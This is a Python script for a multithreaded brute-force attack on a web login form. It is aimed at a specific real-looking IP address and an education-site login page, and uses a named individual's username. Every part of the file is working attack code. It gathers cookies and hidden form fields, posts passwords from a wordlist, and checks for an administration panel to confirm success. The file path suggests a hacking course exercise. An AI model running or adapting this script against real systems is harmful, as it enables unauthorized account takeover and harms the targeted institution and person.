

import urllib.error
import urllib.request
import urllib.parse
import http.cookiejar
import threading
import queue
from html.parser import HTMLParser
import time


user_thread = 10
username = "aliakbar.babayev"
wordlist_file = "/home/samurai/Desktop/Python_For_Hacking/Web_Hackery/wordlist.txt"
resume = None

target_url = "http://5.191.241.123/adnsuEducation/login.jsp"
target_post = "http://5.191.241.123/adnsuEducation/login.jsp"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"



class Bruter(object):
    def __init__(self, username, words):  # Fixed: Added proper __init__ parameters
        self.username = username
        self.password_q = words
        self.found = False
        print(f"Finished setting up for: {username}")
    
    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.daemon = True
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            
            try:
                # Initialize cookie jar and opener
                cookie_jar = http.cookiejar.CookieJar()
                opener = urllib.request.build_opener(
                    urllib.request.HTTPCookieProcessor(cookie_jar),
                    urllib.request.HTTPHandler(debuglevel=1)  # Enable debug
                )
                
                # First GET request to get cookies and form
                print("\n[DEBUG] Making initial GET request...")
                response = opener.open(target_url)
                page = response.read().decode('utf-8', errors='ignore')
                print(f"[DEBUG] Response code: {response.getcode()}")
                print(f"[DEBUG] Cookies: {cookie_jar}")

                # Parse form
                parser = BruteParser()
                parser.feed(page)
                post_tags = parser.tag_results
                print(f"[DEBUG] Found form fields: {post_tags}")

                # Set credentials
                post_tags[username_field] = self.username
                post_tags[password_field] = brute

                # Prepare POST data
                login_data = urllib.parse.urlencode(post_tags).encode('utf-8')
                req = urllib.request.Request(
                    target_post,
                    data=login_data,
                    headers={
                        'User-Agent': 'Mozilla/5.0',
                        'Referer': target_url,
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                )

                print(f"\n[DEBUG] Trying: {self.username}/{brute}")
                print(f"[DEBUG] POST data: {login_data.decode()}")

                # Make POST request
                login_response = opener.open(req)
                login_result = login_response.read().decode("utf-8", errors="ignore")
                print(f"[DEBUG] Login response code: {login_response.getcode()}")
                print(f"[DEBUG] Cookies after login: {cookie_jar}")

                # Check for success
                if success_check in login_result:
                    self.found = True
                    print("\n[+] Bruteforce successful")
                    print(f"[+] Username: {username}")
                    print(f"[+] Password: {brute}")
                else:
                    print("[DEBUG] Login failed for this attempt")

            except urllib.error.HTTPError as e:
                print(f"[ERROR] HTTP Error: {e.code} {e.reason}")
                print(f"[ERROR] Response: {e.read().decode()}")
            except Exception as e:
                print(f"[ERROR] Other error: {str(e)}")


class BruteParser(HTMLParser):

    def __init__(self):

        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        
        if tag == "input":
            tag_name = None
            tag_value = ""

            for name,value in attrs:
                
                if name == "name":
                    tag_name = value
                elif name == "value":
                    tag_value = value
            
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value



def build_wordlist(wordlist_file):

    with open(wordlist_file,"rb") as f:
        raw_words = f.readlines()
    
    found_resume = False
    words = queue.Queue()

    for word in raw_words:

        word = word.rstrip().decode('utf-8',errors='ignore')

        if resume is not None:

            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print(f"Resuming wordlist from: {resume}")
        else:
            words.put(word)

    return words


if __name__ == "__main__":

    print("Building wordlist...")
    words = build_wordlist(wordlist_file)

    print("Starting brute force attack...")
    bruter_obj = Bruter(username,words)
    bruter_obj.run_bruteforce()

    while not bruter_obj.found and threading.active_count() > 1:
        time.sleep(1)
    
    if not bruter_obj.found:
        print("[-] Brute force attack completed unsuccessfully")
